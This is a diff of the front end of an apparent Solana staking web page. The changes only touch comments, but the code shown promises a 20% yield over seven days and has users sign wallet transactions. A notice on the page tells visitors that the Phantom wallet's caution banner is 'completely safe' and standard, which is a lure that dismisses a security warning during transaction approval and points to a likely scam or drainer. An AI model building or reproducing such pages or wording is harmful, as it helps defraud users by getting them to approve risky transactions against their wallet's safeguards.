@@ -47,7 +47,7 @@
   .btn-stake { background: linear-gradient(90deg, var(--gold), #d8a428); color: #1a1000; }
   .btn-withdraw { background: linear-gradient(90deg, #ef4444, #dc2626); color: #ffffff; margin-top: 10px; }
 
-  /* --- LIVE METER STYLES --- */
+  /* LIVE METER STYLES */
   .meter-container { margin-top: 18px; background: rgba(0,229,199,0.05); border: 1px solid var(--line); border-radius: 14px; padding: 16px; }
   .progress-bg { width: 100%; background: rgba(255,255,255,0.1); height: 8px; border-radius: 4px; margin: 12px 0; overflow: hidden; }
   .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--teal), var(--gold)); transition: width 0.4s ease; }
@@ -86,7 +86,7 @@
     <button id="stake-btn" class="action-btn btn-stake" style="display:none;">Stake Tokens</button>
     <button id="withdraw-btn" class="action-btn btn-withdraw" style="display:none;">Withdraw / Claim</button>
 
-    <!-- LIVE METER TRACKER CODE -->
+    <!-- LIVE METER TRACKER -->
     <div id="live-meter-box" class="meter-container" style="display:none;">
       <div style="display:flex; justify-content:space-between; font-size: 13px;">
         <span style="color: var(--muted);">Live Yield (+20%):</span>
@@ -105,7 +105,7 @@
 
     <div id="status-msg" style="margin-top: 14px; font-size: 12px; color: var(--muted); text-align: center; font-family: var(--mono);"></div>
 
-    <!-- PHANTOM NOTICE -->
+    <!-- PHANTOM SAFETY NOTICE -->
     <div class="phantom-notice-box">
       💡 <strong>Note:</strong> Phantom wallet may show a caution/warning banner during transaction approval. This is standard behavior for custom smart contracts and completely safe.
     </div>
@@ -142,7 +142,7 @@
     els.stake.style.display = "block";
     els.withdraw.style.display = "block";
 
-    // Database se user ki purani staking fetch karein
+    // Check Supabase DB for existing active stake
     checkActiveStakeInDB();
   }
 
@@ -156,7 +156,6 @@
     } catch(e) { console.error("DB Check Failed", e); }
   }
 
-  // --- METER CALCULATION & ANIMATION FUNCTION ---
   function startLiveMeter(stakedAmount, startTimeMs) {
     els.meterBox.style.display = "block";
     const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
@@ -206,7 +205,6 @@
     await window.solana.signAndSendTransaction(tx);
     els.status.textContent = "Saving to database...";
 
-    // Stake hone ke baad Supabase me timestamp store hoga
     const startTimeNow = Date.now();
     await fetch(`${BACKEND_URL}/api/stake-fixed/save-stake`, {
       method: "POST",
